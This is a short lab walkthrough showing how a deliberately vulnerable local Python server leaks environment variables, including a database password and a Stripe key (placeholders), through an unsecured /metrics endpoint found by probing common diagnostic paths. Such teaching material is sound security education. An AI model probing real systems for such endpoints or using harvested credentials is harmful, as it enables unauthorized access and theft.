## Prerequisites
First, ensure the vulnerable Python server is running:

```Bash
uvicorn vulnerable:app --reload
```

Exploitation Steps
The goal is to find hidden technical endpoints that leak sensitive infrastructure details and credentials.

1. Perform a Directory Bruteforce (Discovery)
Attackers often scan for common technical paths like /env, /config, /actuator, or /metrics.

```Bash
curl http://127.0.0.1:8000/metrics
```

2. Analyze the Leaked Data
The misconfigured endpoint returns raw environment variables that were supposed to be private to the server's operating system.

Expected Response (Leaked Data):

```Plaintext
# HELP system_env Internal Environment Variables
system_env{name="DATABASE_URL"} postgres://admin:p@ssword123@10.0.45.2:5432/prod_db
system_env{name="STRIPE_API_KEY"} sk_live_51Mzbcdefghijklmnopqrstuvwxyz
```

3. Identify the Impact
The attacker now has:

Database Credentials: Direct access to the production DB (if it's also misconfigured to be public).

Payment Provider Keys: The ability to perform transactions or steal customer data via the Stripe API.

Result: This is a Security Misconfiguration. A diagnostic/monitoring tool was enabled for the convenience of the DevOps team but was not properly secured behind a firewall or authentication layer.